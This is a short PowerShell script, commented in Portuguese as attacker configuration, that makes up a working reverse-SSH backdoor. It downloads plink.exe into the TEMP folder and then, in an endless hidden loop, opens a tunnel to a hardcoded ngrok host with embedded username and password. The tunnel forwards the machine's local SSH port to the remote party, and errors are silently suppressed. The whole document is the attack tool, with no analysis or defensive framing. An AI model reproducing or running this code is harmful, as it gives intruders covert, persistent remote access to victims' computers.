
# Configurações do atacante
$Config = @{
    Host = "0.tcp.sa.ngrok.io"
    Port = "17783"
    User = "logosofico"
    Pass = "robinhood"
    RemotePort = 2222
}

$PlinkPath = "$env:TEMP\plink.exe"

function Ensure-Plink {
    if (!(Test-Path $PlinkPath)) {
        $plinkUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
        Invoke-WebRequest -Uri $plinkUrl -OutFile $PlinkPath -UseBasicParsing
    }
}

function Start-ReverseSSH {
    while ($true) {
        try {
            Ensure-Plink
            $cmd = "`"$PlinkPath`" -ssh $($Config.User)@$($Config.Host) -P $($Config.Port) -pw $($Config.Pass) -R $($Config.RemotePort):localhost:22 -N"
            Start-Process -NoNewWindow -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c $cmd"
        } catch {}
        Start-Sleep -Seconds 300
    }
}

Start-ReverseSSH
